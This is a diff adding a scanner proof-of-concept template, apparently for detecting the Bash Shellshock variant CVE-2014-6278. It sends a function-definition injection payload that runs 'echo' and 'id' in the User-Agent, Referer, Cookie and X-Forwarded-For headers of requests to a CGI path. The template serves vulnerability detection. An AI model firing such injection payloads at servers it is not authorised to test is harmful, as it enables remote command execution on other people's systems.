@@ -1,0 +1,70 @@
+[info]
+author = "ave"
+description = "检测 GNU Bash CVE-2014-6278 (Shellshock 变种) 远程命令注入漏洞，通过 HTTP 请求头注入恶意环境变量触发 CGI 脚本执行任意命令"
+id = "POC-AVE-2014-0406"
+name = "CVE-2014-6278 PoC"
+severity = "high"
+tags = ["ave-2014-0406"]
+vuln_id = [
+    "CVE-2014-6278",
+    "AVE-2014-0406",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/test.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+User-Agent = "() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["CVE-2014-6278 vulnerable"]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/test.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+Referer = "() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["CVE-2014-6278 vulnerable"]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/test.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+Cookie = "() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["CVE-2014-6278 vulnerable"]
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/test.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+X-Forwarded-For = "() { _; } >_[$($())] { echo CVE-2014-6278 vulnerable; id; }"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["CVE-2014-6278 vulnerable"]
